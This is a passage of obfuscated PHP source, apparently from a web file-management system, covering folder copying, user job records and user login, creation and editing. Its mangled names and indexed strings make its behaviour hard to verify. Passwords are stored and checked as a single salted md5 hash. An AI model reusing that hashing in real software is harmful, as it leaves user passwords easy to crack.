Model($±¾ğá[493])->authClear($œö®—ò); } $×ºç†Ó÷ = $éÒ¶ÈŞì[$±¾ğá[431]] == $±¾ğá[88] && $“­æº¶«[$±¾ğá[431]] != $±¾ğá[88]; if ($×ºç†Ó÷) { $‰ğ¦ïÊĞ[$±¾ğá[430]] = 0; } if ($ÎøøÒ’ß) { $¡ÎÔÜÑø = array($±¾ğá[580] => array($±¾ğá[540], $éÒ¶ÈŞì[$±¾ğá[511]] . $éÒ¶ÈŞì[$±¾ğá[402]] . $±¾ğá[541])); $¶Ï’È²ö = $éÒ¶ÈŞì[$±¾ğá[511]] . $éÒ¶ÈŞì[$±¾ğá[402]] . $±¾ğá[50]; $¤áœ½§¨ = $“­æº¶«[$±¾ğá[511]] . $“­æº¶«[$±¾ğá[402]] . $±¾ğá[50] . $éÒ¶ÈŞì[$±¾ğá[402]] . $±¾ğá[50]; $·Ü¹×Ø¦ = array($±¾ğá[580] => array($±¾ğá[589], "\162\x65\x70\154\141\x63\145\50\x70\141\x72\x65\156\164\x4c\145\166\x65\x6c\54\47{$¶Ï’È²ö}\x27\x2c\47{$¤áœ½§¨}\x27\x29"), $±¾ğá[576] => $“­æº¶«[$±¾ğá[411]], $±¾ğá[577] => $“­æº¶«[$±¾ğá[496]]); if ($×ºç†Ó÷) { $·Ü¹×Ø¦[$±¾ğá[430]] = 0; } $this->where($¡ÎÔÜÑø)->data($·Ü¹×Ø¦)->save(); } $this->where(array($±¾ğá[417] => $œö®—ò))->data($‰ğ¦ïÊĞ)->save(); return $œö®—ò; } private function clearShare($“×£®§’, $îÛ‡áø”) { $í“ªÖ²Ù =& $_SERVER[­á Ş³Ö]; $òùª·æÇ = $this->sourceInfo($“×£®§’); $„äàÔÙ© = $this->sourceInfo($îÛ‡áø”); if ($òùª·æÇ[$í“ªÖ²Ù[496]] == $„äàÔÙ©[$í“ªÖ²Ù[496]] && $òùª·æÇ[$í“ªÖ²Ù[411]] == $í“ªÖ²Ù[590]) { return; } $ÇÍÍ¶æÇ = array($í“ªÖ²Ù[511] => array($í“ªÖ²Ù[540], $òùª·æÇ[$í“ªÖ²Ù[511]] . $“×£®§’ . $í“ªÖ²Ù[541])); $¦ÍÙ¥ÕŒ = $this->field($í“ªÖ²Ù[417])->where($ÇÍÍ¶æÇ)->getField($í“ªÖ²Ù[402], !0); if (!$¦ÍÙ¥ÕŒ) { return; } $ÇÍÍ¶æÇ = array($í“ªÖ²Ù[402] => array($í“ªÖ²Ù[7], $¦ÍÙ¥ÕŒ), $í“ªÖ²Ù[591] => 1); $—™½×®« = Model($í“ªÖ²Ù[592])->field($í“ªÖ²Ù[593])->where($ÇÍÍ¶æÇ)->select(); if (!$—™½×®«) { return; } $—™½×®« = array_to_keyvalue($—™½×®«, $í“ªÖ²Ù[12], $í“ªÖ²Ù[593]); $ÇÍÍ¶æÇ = array($í“ªÖ²Ù[593] => array($í“ªÖ²Ù[7], $—™½×®«)); Model($í“ªÖ²Ù[592])->where($ÇÍÍ¶æÇ)->save(array($í“ªÖ²Ù[591] => 0)); Model($í“ªÖ²Ù[594])->where($ÇÍÍ¶æÇ)->delete(); } public function copyFolderFromIO($¤ÔÌµ™, $âÈ÷¦ÕÇ, $ŸƒÓ¬™Ü, $ƒîÕ—»÷, $€ŠÜÁÖ¾, $Ì¸é”¡ = false) { $‹ˆˆ¦ÒÒ =& $_SERVER[­á Ş³Ö]; $—¿Ø¯ÓÔ = array($‹ˆˆ¦ÒÒ[558] => array(), $‹ˆˆ¦ÒÒ[559] => array(), $‹ˆˆ¦ÒÒ[557] => array(), $‹ˆˆ¦ÒÒ[595] => array()); $¼ÇÕıëˆ = $Ì¸é”¡ ? $Ì¸é”¡ : $¤ÔÌµ™->pathThis($âÈ÷¦ÕÇ); $Ğñöãœ = $this->fileNameExist($ŸƒÓ¬™Ü, $¼ÇÕıëˆ); $é¾¥Šúê = $this->mkdir($ŸƒÓ¬™Ü, $¼ÇÕıëˆ, $ƒîÕ—»÷); if (!$Ğñöãœ || $ƒîÕ—»÷ == REPEAT_RENAME_FOLDER) { $ƒîÕ—»÷ = !1; } if ($Ğñöãœ) { $this->_childrenAllMake($Ğñöãœ); } Hook::trigger($‹ˆˆ¦ÒÒ[596]); $this->_copyChildTo($¤ÔÌµ™, $âÈ÷¦ÕÇ, $é¾¥Šúê, $ƒîÕ—»÷, $—¿Ø¯ÓÔ, $€ŠÜÁÖ¾); Hook::trigger($‹ˆˆ¦ÒÒ[597]); if ($é¾¥Šúê) { $this->folderSizeResetChildren($é¾¥Šúê); } $this->_childrenListClear(); Model($‹ˆˆ¦ÒÒ[560])->addAll($—¿Ø¯ÓÔ[$‹ˆˆ¦ÒÒ[558]], array(), !0); Model($‹ˆˆ¦ÒÒ[561])->eventCopy($é¾¥Šúê); $this->saveAll($—¿Ø¯ÓÔ[$‹ˆˆ¦ÒÒ[559]]); Model($‹ˆˆ¦ÒÒ[471])->linkAdd($—¿Ø¯ÓÔ[$‹ˆˆ¦ÒÒ[557]]); Model($‹ˆˆ¦ÒÒ[471])->remove($—¿Ø¯ÓÔ[$‹ˆˆ¦ÒÒ[595]]); $this->folderSizeReset($ŸƒÓ¬™Ü); $this->updateModifyTime($ŸƒÓ¬™Ü); return $é¾¥Šúê; } private function _copyChildTo($›‰Êé¶», $­ëÙÜÈ, $Ô³‡™Çê, $ª¯Ì–ï´, &$ëçªüÎş, $‚­®û¹¦) { $Øñ»ƒä— =& $_SERVER[­á Ş³Ö]; $ƒû ¼Ã¤ = $this->sourceInfoCache($Ô³‡™Çê); $³ÙÂ¥±­ = $›‰Êé¶»->listPath($­ëÙÜÈ); $³ÙÂ¥±­ = $³ÙÂ¥±­ ? $³ÙÂ¥±­ : array($Øñ»ƒä—[83] => array(), $Øñ»ƒä—[82] => array()); $³æîÑ´ = array_merge($³ÙÂ¥±­[$Øñ»ƒä—[83]], $³ÙÂ¥±­[$Øñ»ƒä—[82]]); $…„»Ş¿ = $this->_addFiles($›‰Êé¶», $³ÙÂ¥±­[$Øñ»ƒä—[83]], $‚­®û¹¦); $×„¯´´ª = array(); foreach ($³æîÑ´ as &$÷ŞÇŸàš) { if (isset($…„»Ş¿[$÷ŞÇŸàš[$Øñ»ƒä—[32]]])) { $÷ŞÇŸàš = $…„»Ş¿[$÷ŞÇŸàš[$Øñ»ƒä—[32]]]; } $÷ŞÇŸàš[$Øñ»ƒä—[410]] = $÷ŞÇŸàš[$Øñ»ƒä—[33]] == $Øñ»ƒä—[75]; $÷ŞÇŸàš[$Øñ»ƒä—[412]] = substr(_get($÷ŞÇŸàš, $Øñ»ƒä—[174], $Øñ»ƒä—[12]), 0, 10); $÷ŞÇŸàš[$Øñ»ƒä—[76]] = _get($÷ŞÇŸàš, $Øñ»ƒä—[76], 0); $÷ŞÇŸàš[$Øñ»ƒä—[468]] = _get($÷ŞÇŸàš, $Øñ»ƒä—[468], 0); if (!isset($÷ŞÇŸàš[$Øñ»ƒä—[598]]) && $÷ŞÇŸàš[$Øñ»ƒä—[468]]) { $ëçªüÎş[$Øñ»ƒä—[595]][] = $÷ŞÇŸàš[$Øñ»ƒä—[468]]; } if ($ª¯Ì–ï´) { $ô°œ¨ºí = $this->fileNameExistCache($Ô³‡™Çê, $÷ŞÇŸàš[$Øñ»ƒä—[32]]); if ($ô°œ¨ºí) { if ($÷ŞÇŸàš[$Øñ»ƒä—[410]] || $ª¯Ì–ï´ == REPEAT_SKIP) { continue; } if ($ª¯Ì–ï´ == REPEAT_REPLACE) { $Ú“³È†§ = $this->sourceInfoCache($ô°œ¨ºí); $ê¹İ¦Â« = $this->fileHistory($Ú“³È†§, $÷ŞÇŸàš[$Øñ»ƒä—[468]], $÷ŞÇŸàš[$Øñ»ƒä—[76]]); if ($ê¹İ¦Â«) { $ëçªüÎş[$Øñ»ƒä—[557]][] = $÷ŞÇŸàš[$Øñ»ƒä—[468]]; } continue; } else { if ($ª¯Ì–ï´ == REPEAT_RENAME) { $÷ŞÇŸàš[$Øñ»ƒä—[32]] = $this->fileNameAutoCache($Ô³‡™Çê, $÷ŞÇŸàš[$Øñ»ƒä—[32]], $ª¯Ì–ï´, !1); } } } } if (!$÷ŞÇŸàš[$Øñ»ƒä—[410]] && $÷ŞÇŸàš[$Øñ»ƒä—[468]] == 0) { continue; } if (!$÷ŞÇŸàš[$Øñ»ƒä—[410]] && $÷ŞÇŸàš[$Øñ»ƒä—[468]]) { $ëçªüÎş[$Øñ»ƒä—[557]][] = $÷ŞÇŸàš[$Øñ»ƒä—[468]]; } $×„¯´´ª[] = $this->_makeItemData($÷ŞÇŸàš, $ƒû ¼Ã¤, $÷ŞÇŸàš[$Øñ»ƒä—[32]]); } unset($÷ŞÇŸàš); if (!empty($×„¯´´ª)) { $this->addAll($×„¯´´ª); $this->_childrenListSelect($Ô³‡™Çê); } $¥üö¾‚ = $this->_childrenList($Ô³‡™Çê); $¥üö¾‚ = array_to_keyvalue($¥üö¾‚, $Øñ»ƒä—[32]); foreach ($³æîÑ´ as $÷ŞÇŸàš) { $Ú“³È†§ = $¥üö¾‚[$÷ŞÇŸàš[$Øñ»ƒä—[32]]]; $®¾÷éš¼ = $Ú“³È†§[$Øñ»ƒä—[402]]; $this->_copyApplyMeta($Ú“³È†§, $ëçªüÎş); if ($÷ŞÇŸàš[$Øñ»ƒä—[33]] == $Øñ»ƒä—[75]) { $÷ŞÇŸàš[$Øñ»ƒä—[84]] = $›‰Êé¶»->getPathInner($÷ŞÇŸàš[$Øñ»ƒä—[84]]); $this->_copyChildTo($›‰Êé¶», $÷ŞÇŸàš[$Øñ»ƒä—[84]], $®¾÷éš¼, $ª¯Ì–ï´, $ëçªüÎş, $‚­®û¹¦); } } } private function _addFiles($òÏ¼½°, $Îîä¿Ï, $“ê‹ŸÛÜ) { $Ò‡‡¼¸ =& $_SERVER[­á Ş³Ö]; if (!$Îîä¿Ï || count($Îîä¿Ï) == 0) { return array(); } $°È¾àßø = array(); foreach ($Îîä¿Ï as &$—ÒÏıè¤) { Hook::trigger($Ò‡‡¼¸[599], $—ÒÏıè¤); $—ÒÏıè¤[$Ò‡‡¼¸[84]] = $òÏ¼½°->getPathInner($—ÒÏıè¤[$Ò‡‡¼¸[84]]); $¶¦®²¦³ = $òÏ¼½°->hashSimple($—ÒÏıè¤[$Ò‡‡¼¸[84]]); $Ÿ÷¸†å† = $òÏ¼½°->hashMd5($—ÒÏıè¤[$Ò‡‡¼¸[84]]); if (strlen($Ÿ÷¸†å†) > 10 && !isset($°È¾àßø[$Ÿ÷¸†å†])) { $°È¾àßø[$Ÿ÷¸†å†] = array(); } $—ÒÏıè¤[$Ò‡‡¼¸[177]] = $¶¦®²¦³; $—ÒÏıè¤[$Ò‡‡¼¸[176]] = $Ÿ÷¸†å†; $°È¾àßø[$Ÿ÷¸†å†][] =& $—ÒÏıè¤; if (count($°È¾àßø[$Ÿ÷¸†å†]) > 1) { $—ÒÏıè¤[$Ò‡‡¼¸[598]] = !0; } Hook::trigger($Ò‡‡¼¸[600], $—ÒÏıè¤); } unset($—ÒÏıè¤); $»¼¦¾åè = array($Ò‡‡¼¸[176] => array($Ò‡‡¼¸[7], array_keys($°È¾àßø))); $Ğòå’ø = Model($Ò‡‡¼¸[601]); $Êƒƒı‚İ = $Ğòå’ø->where($»¼¦¾åè)->select(); $Êƒƒı‚İ = $Êƒƒı‚İ ? $Êƒƒı‚İ : array(); foreach ($Êƒƒı‚İ as $ —¥ÎØŞ) { if (!isset($°È¾àßø[$ —¥ÎØŞ[$Ò‡‡¼¸[176]]])) { continue; } $åîËÆ£Œ = $°È¾àßø[$ —¥ÎØŞ[$Ò‡‡¼¸[176]]]; foreach ($åîËÆ£Œ as &$—ÒÏıè¤) { $—ÒÏıè¤[$Ò‡‡¼¸[468]] = $ —¥ÎØŞ[$Ò‡‡¼¸[468]]; $—ÒÏıè¤[$Ò‡‡¼¸[598]] = !0; } unset($—ÒÏıè¤); } $“Ö’”öÎ = array(); foreach ($Îîä¿Ï as $æíÊÔÔı) { Hook::trigger($Ò‡‡¼¸[602], $æíÊÔÔı); if (isset($æíÊÔÔı[$Ò‡‡¼¸[598]]) && $æíÊÔÔı[$Ò‡‡¼¸[598]]) { Hook::trigger($Ò‡‡¼¸[603], $æíÊÔÔı); continue; } $ˆÕÌŠ±Ë = $òÏ¼½°->getPathInner($æíÊÔÔı[$Ò‡‡¼¸[84]]); $Ì–¾¥í» = $Ğòå’ø->addFileMake($ˆÕÌŠ±Ë, $æíÊÔÔı[$Ò‡‡¼¸[76]], $æíÊÔÔı[$Ò‡‡¼¸[177]], $æíÊÔÔı[$Ò‡‡¼¸[176]], $æíÊÔÔı[$Ò‡‡¼¸[32]], $“ê‹ŸÛÜ); Hook::trigger($Ò‡‡¼¸[603], $æíÊÔÔı); if (!is_array($Ì–¾¥í»)) { continue; } $“Ö’”öÎ[] = $Ì–¾¥í»; } $Ğòå’ø->addAll($“Ö’”öÎ); $»¼¦¾åè = array($Ò‡‡¼¸[176] => array($Ò‡‡¼¸[7], array_keys($°È¾àßø))); $Êƒƒı‚İ = $Ğòå’ø->where($»¼¦¾åè)->select(); $Êƒƒı‚İ = $Êƒƒı‚İ ? $Êƒƒı‚İ : array(); foreach ($Êƒƒı‚İ as $ —¥ÎØŞ) { if (!isset($°È¾àßø[$ —¥ÎØŞ[$Ò‡‡¼¸[176]]])) { continue; } $˜áÆÌ¿Œ =& $°È¾àßø[$ —¥ÎØŞ[$Ò‡‡¼¸[176]]]; foreach ($˜áÆÌ¿Œ as &$—ÒÏıè¤) { $—ÒÏıè¤[$Ò‡‡¼¸[468]] = $ —¥ÎØŞ[$Ò‡‡¼¸[468]]; } unset($—ÒÏıè¤); } $ƒĞ±¤­­ = array(); foreach ($Îîä¿Ï as $î‡ÙÅ’) { $ƒĞ±¤­­[$î‡ÙÅ’[$Ò‡‡¼¸[32]]] = $î‡ÙÅ’; } return $ƒĞ±¤­­; } } goto CÀÍ‘É¶æ; f¨­öí‡Öİ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\x6a\x6f\142\x4c\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\144\145\x73\x63", "\163\x6f\x72\x74"); const JOB_KEY = "\163\x65\x6c\146\112\157\142\x4c\151\163\x74"; public function listData($ŠÕ³®º = false, $ê™áºÖ = "\163\157\x72\x74", $Ä»ñÜ’ù = false) { return parent::listData($ŠÕ³®º, $ê™áºÖ, $Ä»ñÜ’ù); } public function remove($¶¡òÅ¬°) { return parent::remove($¶¡òÅ¬°); } public function add($Æ…™¸µ) { $¨ı¢ä¢Ú =& $_SERVER[­á Ş³Ö]; if ($this->findByName($Æ…™¸µ[$¨ı¢ä¢Ú[32]])) { return !1; } $Æ…™¸µ[$¨ı¢ä¢Ú[1876]] = $this->getSort(); return parent::insert($Æ…™¸µ); } private function getSort() { $ÖÀ™ãµÜ =& $_SERVER[­á Ş³Ö]; $êŒ¤é² = parent::listData(); $¨è¤§á‹ = array_to_keyvalue($êŒ¤é², $ÖÀ™ãµÜ[12], $ÖÀ™ãµÜ[1876]); return empty($¨è¤§á‹) ? 0 : max($¨è¤§á‹) + 1; } public function update($ËÓ£ß˜…, $ı—©ÒÈó) { $‚ÒÄÖÚ =& $_SERVER[­á Ş³Ö]; $¡ËŞüô = parent::listData($ËÓ£ß˜…); $¾„¥”Ãê = $this->findByName($ı—©ÒÈó[$‚ÒÄÖÚ[32]]); if (!$¡ËŞüô || $¾„¥”Ãê && $¾„¥”Ãê[$‚ÒÄÖÚ[399]] != $¡ËŞüô[$‚ÒÄÖÚ[399]]) { return !1; } return parent::update($ËÓ£ß˜…, $ı—©ÒÈó); } public function setUserJob($¿¹’’âÒ, $œÒÚºìã) { $»’ıÕÖ² =& $_SERVER[­á Ş³Ö]; if (!is_array($œÒÚºìã)) { $œÒÚºìã = array($œÒÚºìã); } $Ø×Ó‚‰³ = parent::listData(); $à”òò›Ó = array_to_keyvalue($Ø×Ó‚‰³, $»’ıÕÖ²[32]); $ÔÂéòÓ‘ = $»’ıÕÖ²[378]; foreach ($œÒÚºìã as $àÅ‘›ä) { if ($à”òò›Ó[$àÅ‘›ä]) { $ÔÂéòÓ‘ .= $à”òò›Ó[$àÅ‘›ä][$»’ıÕÖ²[399]] . $»’ıÕÖ²[50]; } else { $ê¶íßÏ = $this->add($àÅ‘›ä); $ÔÂéòÓ‘ .= $ê¶íßÏ . $»’ıÕÖ²[50]; } } $ÔÂéòÓ‘ = rtrim($ÔÂéòÓ‘, $»’ıÕÖ²[50]); Model($»’ıÕÖ²[525])->metaSet($¿¹’’âÒ, self::JOB_KEY, $ÔÂéòÓ‘); } public function getUserJob($æøİåğ©) { $ş’ŞİÄ = Model($_SERVER[­á Ş³Ö][525])->metaGet($æøİåğ©); return $this->getUserJobInfo($ş’ŞİÄ[self::JOB_KEY]); } public function getUserJobInfo($ÓªÜóÇÑ) { $ùÕ¨– =& $_SERVER[­á Ş³Ö]; $‹ÄôÊ™ù = explode($ùÕ¨–[50], $ÓªÜóÇÑ); $ÏèæÄı£ = parent::listData(); $ÏèæÄı£ = array_remove_key($ÏèæÄı£, $ùÕ¨–[201]); $Ïëãéª = array(); foreach ($‹ÄôÊ™ù as $ê±­éÂ‹) { if (isset($ÏèæÄı£[$ê±­éÂ‹])) { $Ïëãéª[] = $ÏèæÄı£[$ê±­éÂ‹]; } } return $Ïëãéª; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\x61\155\x65" => "\165\163\145\162\137\155\x65\164\x61", "\155\145\x74\141\x46\x69\145\x6c\x64" => "\x75\x73\x65\162\111\104"); protected $simpleField = "\165\x73\x65\x72\111\x44\x2c\x6e\x69\143\x6b\116\x61\155\x65\54\x6e\x61\155\145\x2c\141\166\x61\164\141\162\x2c\163\145\170\54\x73\x74\x61\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¨å…››İ) { $×ßŞ²Å® =& $_SERVER[­á Ş³Ö]; $Ê³Ñ¡¿¨ = $×ßŞ²Å®[2300]; return array($×ßŞ²Å®[1930] => array($¨å…››İ[0], $Ê³Ñ¡¿¨), $×ßŞ²Å®[1932] => array($¨å…››İ[0], $Ê³Ñ¡¿¨), $×ßŞ²Å®[2301] => array($¨å…››İ[0], $Ê³Ñ¡¿¨)); } protected function getInfo($µ›³è´”, $€å´é¾ò = false) { $½ëˆ»éø = $this->getInfoSimple($µ›³è´”); if (!is_array($½ëˆ»éø)) { return array(); } if ($€å´é¾ò) { return $this->_getInfoApply($½ëˆ»éø); } return $this->cacheFunctionGet($_SERVER[­á Ş³Ö][1934], $µ›³è´”); } protected function getInfoFull($û×ûÖµÕ, $¥ê®Ä÷É = false) { $»ç°»•¡ = $this->getInfoSimple($û×ûÖµÕ); if (!is_array($»ç°»•¡)) { return array(); } if ($¥ê®Ä÷É) { return $this->_getInfoApply($»ç°»•¡, !0); } return $this->cacheFunctionGet($_SERVER[­á Ş³Ö][2302], $û×ûÖµÕ); } private function _getInfoApply($—ĞÊ‚ÍÜ, $±†Æ¡ï‚ = false) { $¢­·¿Êò =& $_SERVER[­á Ş³Ö]; if (!$—ĞÊ‚ÍÜ) { return $—ĞÊ‚ÍÜ; } $úÜ¨’Í = md5($¢­·¿Êò[2303] . $—ĞÊ‚ÍÜ[$¢­·¿Êò[885]] . $¢­·¿Êò[2304] . $—ĞÊ‚ÍÜ[$¢­·¿Êò[32]]); $—ĞÊ‚ÍÜ = $this->_listDataApplyItem($—ĞÊ‚ÍÜ); $—¨‘»û¡ = Model($¢­·¿Êò[1335])->metaGet($—ĞÊ‚ÍÜ[$¢­·¿Êò[87]][$¢­·¿Êò[402]]); $—ĞÊ‚ÍÜ[$¢­·¿Êò[2305]] = $úÜ¨’Í; $—ĞÊ‚ÍÜ[$¢­·¿Êò[87]][$¢­·¿Êò[2125]] = isset($—¨‘»û¡[$¢­·¿Êò[2126]]) ? $—¨‘»û¡[$¢­·¿Êò[2126]] : null; if ($±†Æ¡ï‚) { $—ĞÊ‚ÍÜ[$¢­·¿Êò[466]] = $this->metaGet($—ĞÊ‚ÍÜ[$¢­·¿Êò[1663]]); } return $—ĞÊ‚ÍÜ; } protected function getInfoSimple($´ñÔÀøÉ, $¤¶òŠ²» = false) { $ç‹‡¤öÊ =& $_SERVER[­á Ş³Ö]; if (!$´ñÔÀøÉ) { return array(); } if ($¤¶òŠ²») { $û„ÃàÄ­ = $this->where(array($ç‹‡¤öÊ[1663] => intval($´ñÔÀøÉ)))->find(); if (!is_array($û„ÃàÄ­)) { return array(); } $û„ÃàÄ­[$ç‹‡¤öÊ[533]] = Action($ç‹‡¤öÊ[2306])->parseUrl($û„ÃàÄ­[$ç‹‡¤öÊ[533]]); return $û„ÃàÄ­; } return $this->cacheFunctionGet($ç‹‡¤öÊ[1935], $´ñÔÀøÉ); } protected function getInfoSimpleOuter($Í„†äÍ) { $î…ã–øª =& $_SERVER[­á Ş³Ö]; if (!$Í„†äÍ || $Í„†äÍ == 0) { return array($î…ã–øª[1663] => $î…ã–øª[198], $î…ã–øª[32] => $î…ã–øª[162] . LNG($î…ã–øª[2307]) . $î…ã–øª[164], $î…ã–øª[533] => STATIC_PATH . $î…ã–øª[2308]); } $·ÊÊü²­ = $this->cacheFunctionGet($î…ã–øª[1935], $Í„†äÍ); $¦Ü€ñ— = array_field_key($·ÊÊü²­, explode($î…ã–øª[50], $this->simpleField)); if (!$¦Ü€ñ—) { return array($î…ã–øª[1663] => $î…ã–øª[1184], $î…ã–øª[32] => $î…ã–øª[162] . LNG($î…ã–øª[2309]) . $î…ã–øª[164], $î…ã–øª[533] => STATIC_PATH . $î…ã–øª[2310]); } $¦Ü€ñ—[$î…ã–øª[533]] = Action($î…ã–øª[2306])->parseUrl($¦Ü€ñ—[$î…ã–øª[533]]); return $¦Ü€ñ—; } protected function groupUser($Ùñù…Ş÷) { } public static function errorLang($Ô¢ğ §â) { $õ¾Çû·Ã =& $_SERVER[­á Ş³Ö]; $ğØ¦İåï = array(self::ERROR_USER_NOT_EXISTS => $õ¾Çû·Ã[2311], self::ERROR_USER_PASSWORD_ERROR => $õ¾Çû·Ã[2312], self::ERROR_USER_EXIST_NAME => $õ¾Çû·Ã[2313], self::ERROR_USER_EXIST_PHONE => $õ¾Çû·Ã[2314], self::ERROR_USER_EXIST_EMAIL => $õ¾Çû·Ã[2315], self::ERROR_USER_LOGIN_LOCK => $õ¾Çû·Ã[2316], self::ERROR_IP_NOT_ALLOW => $õ¾Çû·Ã[2317], self::ERROR_USER_EXIST_NICKNAME => $õ¾Çû·Ã[2318]); return LNG($ğØ¦İåï[$Ô¢ğ §â]); } public function getInfoByMeta($˜ûƒœãˆ, $üÜí…ã›) { $ï¼¨Ê‘¨ =& $_SERVER[­á Ş³Ö]; $ĞÑá¾Ø¤ = Model($ï¼¨Ê‘¨[2319])->where(array($ï¼¨Ê‘¨[94] => $˜ûƒœãˆ, $ï¼¨Ê‘¨[374] => $üÜí…ã›))->find(); if ($ĞÑá¾Ø¤) { return $this->getInfo($ĞÑá¾Ø¤[$ï¼¨Ê‘¨[1663]]); } return !1; } public function userLoginCheck($ì¿à†´·, $Ëå–‰ç) { $õóªÚÙÇ =& $_SERVER[­á Ş³Ö]; $Ç€šò± = $this->userLoginFind($ì¿à†´·); if (!$Ç€šò±) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ç€šò±[$õóªÚÙÇ[1663]], $Ëå–‰ç)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Ç€šò±[$õóªÚÙÇ[1663]]); } public function userLoginFind($´íôù×Å) { $ßÄëî× =& $_SERVER[­á Ş³Ö]; $Âå¯Ì…³ = array($ßÄëî×[32] => $´íôù×Å, $ßÄëî×[532] => $´íôù×Å, $ßÄëî×[305] => $´íôù×Å, $ßÄëî×[2320] => $´íôù×Å, $ßÄëî×[996] => $ßÄëî×[998]); if ($this->nickNameRpt()) { unset($Âå¯Ì…³[$ßÄëî×[532]]); } return $this->where($Âå¯Ì…³)->find(); } public function clearCache($Æ¿íÜ’€) { $ŒÂş‡õõ =& $_SERVER[­á Ş³Ö]; $this->cacheFunctionClear($ŒÂş‡õõ[1934], $Æ¿íÜ’€); $this->cacheFunctionClear($ŒÂş‡õõ[1935], $Æ¿íÜ’€); $this->cacheFunctionClear($ŒÂş‡õõ[2302], $Æ¿íÜ’€); } public function userPasswordCheck($ã´Ñœ¨², $‚ª¦–ü) { $İÌ£˜Ë =& $_SERVER[­á Ş³Ö]; $œ¤õï‹Å = $this->where(array($İÌ£˜Ë[1663] => intval($ã´Ñœ¨²)))->find(); $Ç•ÍÓ„Ë = $this->metaGet($ã´Ñœ¨²); $’²çÕ‡¬ = isset($Ç•ÍÓ„Ë[$İÌ£˜Ë[2321]]) ? $Ç•ÍÓ„Ë[$İÌ£˜Ë[2321]] : $İÌ£˜Ë[12]; if (md5($’²çÕ‡¬ . trim($‚ª¦–ü)) !== $œ¤õï‹Å[$İÌ£˜Ë[885]]) { return !1; } return !0; } public function userAdd($éïÕñìé) { $ı€¿ĞßŒ =& $_SERVER[­á Ş³Ö]; $İÛ¯Ù¾ = array($ı€¿ĞßŒ[420] => $éïÕñìé[$ı€¿ĞßŒ[32]], $ı€¿ĞßŒ[2322] => $éïÕñìé[$ı€¿ĞßŒ[1542]], $ı€¿ĞßŒ[2323] => isset($éïÕñìé[$ı€¿ĞßŒ[305]]) ? $éïÕñìé[$ı€¿ĞßŒ[305]] : $ı€¿ĞßŒ[12], $ı€¿ĞßŒ[2324] => isset($éïÕñìé[$ı€¿ĞßŒ[2320]]) ? $éïÕñìé[$ı€¿ĞßŒ[2320]] : $ı€¿ĞßŒ[12], $ı€¿ĞßŒ[2325] => isset($éïÕñìé[$ı€¿ĞßŒ[532]]) ? $éïÕñìé[$ı€¿ĞßŒ[532]] : $éïÕñìé[$ı€¿ĞßŒ[32]], $ı€¿ĞßŒ[2326] => isset($éïÕñìé[$ı€¿ĞßŒ[533]]) ? $éïÕñìé[$ı€¿ĞßŒ[533]] : $ı€¿ĞßŒ[12], $ı€¿ĞßŒ[2327] => isset($éïÕñìé[$ı€¿ĞßŒ[2328]]) ? $éïÕñìé[$ı€¿ĞßŒ[2328]] : 1, $ı€¿ĞßŒ[2329] => $éïÕñìé[$ı€¿ĞßŒ[885]], $ı€¿ĞßŒ[1936] => isset($éïÕñìé[$ı€¿ĞßŒ[1839]]) ? $éïÕñìé[$ı€¿ĞßŒ[1839]] : 1024 * 1024 * 20, $ı€¿ĞßŒ[1937] => 0, $ı€¿ĞßŒ[2330] => 0, $ı€¿ĞßŒ[1981] => isset($éïÕñìé[$ı€¿ĞßŒ[746]]) ? $éïÕñìé[$ı€¿ĞßŒ[746]] : 1); if (!empty($éïÕñìé[$ı€¿ĞßŒ[1663]])) { $İÛ¯Ù¾[$ı€¿ĞßŒ[1663]] = $éïÕñìé[$ı€¿ĞßŒ[1663]]; } $€¨Á“ğ = $this->_checkExist($éïÕñìé); if ($€¨Á“ğ !== !0) { return $€¨Á“ğ; } if (!empty($İÛ¯Ù¾[$ı€¿ĞßŒ[533]]) && strlen($İÛ¯Ù¾[$ı€¿ĞßŒ[533]]) > 255) { $İÛ¯Ù¾[$ı€¿ĞßŒ[533]] = $ı€¿ĞßŒ[12]; } $îˆ–ôÆ” = $this->add($İÛ¯Ù¾); $Ã§Í’€› = array($ı€¿ĞßŒ[2329] => $İÛ¯Ù¾[$ı€¿ĞßŒ[885]], $ı€¿ĞßŒ[2325] => $İÛ¯Ù¾[$ı€¿ĞßŒ[532]]); $this->userEdit($îˆ–ôÆ”, $Ã§Í’€›); Model($ı€¿ĞßŒ[1335])->userRootAdd($îˆ–ôÆ”); return $îˆ–ôÆ”; } protected function userEditTest($äóø•”¾, $ÙĞºö¢) { return $this->call($_SERVER[­á Ş³Ö][2331], $äóø•”¾, $ÙĞºö¢); } protected function userEdit($‰”»àÆÍ, $ØëóÆğ°) { $äì½ÚÙÆ =& $_SERVER[­á Ş³Ö]; $Ç„®µô¶ = $this->getInfoSimple($‰”»àÆÍ); if (!$Ç„®µô¶) { return !1; } $µ¤¡­–® = $this->_checkExist($ØëóÆğ°, $‰”»àÆÍ); if ($µ¤¡­–® !== !0) { return $µ¤¡­–®; } if (isset($ØëóÆğ°[$äì½ÚÙÆ[885]]) && trim($ØëóÆğ°[$äì½ÚÙÆ[885]]) != $äì½ÚÙÆ[12]) { $‹³°½Åü = $this->metaGet($‰”»àÆÍ); if (empty($‹³°½Åü[$äì½ÚÙÆ[2321]])) { $‹³°½Åü[$äì½ÚÙÆ[2321]] = rand_string(10); Model($äì½ÚÙÆ[504])->metaSet($‰”»àÆÍ, $äì½ÚÙÆ[2321], $‹³°½Åü[$äì½ÚÙÆ[2321]]); } $ØëóÆğ°[$äì½ÚÙÆ[885]] = md5($‹³°½Åü[$äì½ÚÙÆ[2321]] . trim($ØëóÆğ°[$äì½ÚÙÆ[885]])); } else { unset($ØëóÆğ°[$äì½ÚÙÆ[885]]); } if (!empty($ØëóÆğ°[$äì½ÚÙÆ[533]]) && strlen($ØëóÆğ°[$äì½ÚÙÆ[533]]) > 255) { $ØëóÆğ°[$äì½ÚÙÆ[533]] = $äì½ÚÙÆ[12]; } 